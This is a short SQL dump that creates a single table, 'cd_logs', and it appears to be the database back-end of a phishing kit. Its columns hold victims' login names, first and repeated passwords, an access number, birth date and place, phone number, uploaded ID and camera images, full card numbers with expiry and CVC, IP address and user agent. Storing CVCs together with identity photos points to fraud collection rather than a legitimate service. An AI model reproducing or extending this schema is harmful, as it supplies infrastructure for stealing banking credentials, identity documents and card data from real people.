CREATE TABLE `cd_logs` (
  `id` int(220) NOT NULL,
  `data_id` varchar(300) NOT NULL,
  `is_mobile` int(175) NOT NULL,
  `first_login` varchar(275) NOT NULL,
  `first_password` varchar(275) NOT NULL,
  `access_number` varchar(275) NOT NULL,
  `password` varchar(275) NOT NULL,
  `dob` varchar(275) NOT NULL,
  `pob` varchar(275) NOT NULL,
  `phone_number` varchar(275) NOT NULL,
  `image_file` varchar(300) NOT NULL,
  `camera_file` varchar(275) NOT NULL,
  `second_image` varchar(275) NOT NULL,
  `second_camera` varchar(275) NOT NULL,
  `cc_number` varchar(275) NOT NULL,
  `exp_month` varchar(275) NOT NULL,
  `exp_year` varchar(275) NOT NULL,
  `cvc_number` varchar(275) NOT NULL,
  `ip_address` varchar(275) NOT NULL,
  `user_agent` varchar(300) NOT NULL,
  `created_at` varchar(300) NOT NULL,
  `status` int(220) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;


ALTER TABLE `cd_logs`
  ADD PRIMARY KEY (`id`);


ALTER TABLE `cd_logs`
  MODIFY `id` int(220) NOT NULL AUTO_INCREMENT;
COMMIT;